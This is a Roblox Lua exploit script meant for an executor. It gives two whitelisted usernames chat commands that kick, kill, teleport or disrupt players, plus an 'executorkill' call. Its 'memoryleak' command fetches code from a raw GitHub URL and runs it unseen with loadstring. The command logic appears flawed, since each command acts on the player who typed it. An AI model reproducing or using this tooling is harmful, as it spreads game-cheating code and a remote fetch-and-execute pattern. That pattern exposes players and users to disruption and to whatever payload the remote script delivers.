local whitelist = {
    ["just12281oom"] = true,
    ["PolarCtCutie"] = true
}

local text = "commands ~ lagback, leave, kick, executorkill, memoryleak, kill"
local colors = {
    Color3.fromRGB(205, 160, 255),
    Color3.fromRGB(145, 160, 200)
}

local commands = ""
for i = 1, #text do
    local t = i / #text
    local color = Color3.new(
        colors[1].R + (colors[2].R - colors[1].R) * t,
        colors[1].G + (colors[2].G - colors[1].G) * t,
        colors[1].B + (colors[2].B - colors[1].B) * t
    )
    commands = commands .. string.format("<font color=\"rgb(%d, %d, %d)\"><b>%s</b></font>", color.R * 255, color.G * 255, color.B * 255, text:sub(i, i))
end

local commandsFunc = {
    lagback = function(player)
        player.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
    end,
    leave = function(player)
        player:Kick("You have left the game.")
    end,
    kick = function(player)
        player:Kick("You have been kicked!")
    end,
    executorkill = function(player)
        task.spawn(function()
            setfpscap(9e9)
        end)
    end,
    memoryleak = function(player)
        local success, errorMessage = pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/memoryleak'))()
        end)
        if not success then
            print("Error loading memoryleak script:", errorMessage)
        end
    end,
    kill = function(player)
        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
    end
}

local function onChatMessage(player, message)
    if not whitelist[player.Name] then
        return
    end
    
    local command = message:lower()
    if commandsFunc[command] then
        commandsFunc[command](player)
    end
end

local function onPlayerChatted(player)
    player.Chatted:Connect(function(message)
        onChatMessage(player, message)
    end)
end

game.Players.PlayerAdded:Connect(onPlayerChatted)

for _, player in ipairs(game.Players:GetPlayers()) do
    onPlayerChatted(player)
end

local player = game.Players.LocalPlayer
if whitelist[player.Name] then
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = commands,
        Color = Color3.fromRGB(255, 255, 255)
    })
end
